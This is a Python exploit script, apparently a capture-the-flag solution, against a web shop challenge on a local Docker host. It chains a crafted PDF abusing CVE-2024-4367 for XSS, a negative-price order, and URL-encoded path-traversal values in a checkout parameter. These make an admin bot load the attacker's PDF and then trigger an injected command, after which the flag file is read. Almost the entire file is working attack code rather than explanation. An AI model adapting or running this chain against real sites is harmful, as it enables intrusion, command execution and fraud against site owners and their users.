import requests
import urllib.parse
import time
import os
#suppose you already have crafted a pdf using CVE-2024-4367 to trigger xss
#you should login and submit a negative price, and get the order_id by access /subs
order_id="1"#fixit
pdfurl="your-host-with-pdf" #change to your pdf url,you can also use the pdf in github
docker_host="http://192.168.205.128:1337" #change it to ip of your docker machine
trigger_bot="/../../../admin/view-pdf?url="+pdfurl+"?&a="
trigger_bot=urllib.parse.quote(trigger_bot)
trigger_bot_triggerCMD="/../../../admin/product-stream?&a="
trigger_bot_triggerCMD=urllib.parse.quote(trigger_bot_triggerCMD)
r=requests.get(docker_host+"/checkout/success?payment_id="+trigger_bot+"&order_id="+order_id)#inject cmd
print(r.status_code)
r=requests.get(docker_host+"/checkout/success?payment_id="+trigger_bot_triggerCMD+"&order_id="+order_id)#trigger cmd
print(r.status_code)

#run and access /static/flag.txt to get flag

